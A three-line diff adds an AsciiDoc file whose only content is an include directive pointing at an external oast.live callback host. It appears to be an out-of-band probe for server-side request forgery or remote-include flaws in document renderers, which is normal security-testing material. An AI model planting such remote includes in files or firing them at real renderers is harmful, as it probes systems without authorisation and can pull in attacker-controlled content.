@@ -1,0 +1,3 @@
+= Doc
+:inc: http://db9bakg3jqa19mjttb00e1mbwottjwgba.oast.live/attr
+include::{inc}[]
